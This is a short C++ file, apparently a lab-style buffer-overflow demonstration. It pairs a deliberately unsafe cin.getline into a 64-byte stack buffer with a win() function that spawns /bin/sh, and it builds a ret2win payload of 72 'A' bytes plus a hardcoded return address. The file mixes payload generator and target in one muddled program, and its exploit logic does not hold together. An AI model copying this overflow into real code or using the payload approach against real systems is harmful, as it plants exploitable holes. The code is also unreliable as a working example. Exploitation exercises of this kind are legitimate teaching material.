#include <iostream>
#include <fstream>
#include <cstring>

using namespace std;

void win()
{
    cout << "You win! Shell would spawn here." << endl;
    system("/bin/sh");
}

void vulnerable()
{
    char buf[64];
    cout << "Enter payload: ";
    cin.getline(buf, 256);
    cout << "You entered: " << buf << endl;
}

int main()
{
    const int padding = 72;
    unsigned long win_addr = 0x4011d6; // address from the test to change
    char buf[padding + sizeof(win_addr)];

    // Fill with 'A's
    memset(buf, 'A', padding);

    // Append win() address in little-endian
    memcpy(buf + padding, &win_addr, sizeof(win_addr));

    // Write to stdout (can redirect to file or pipe)
    std::cout.write(buf, sizeof(buf));

    cout << "Address of win(): " << (void *)win << endl; // Leak for exploit
    vulnerable();
    return 0;
}
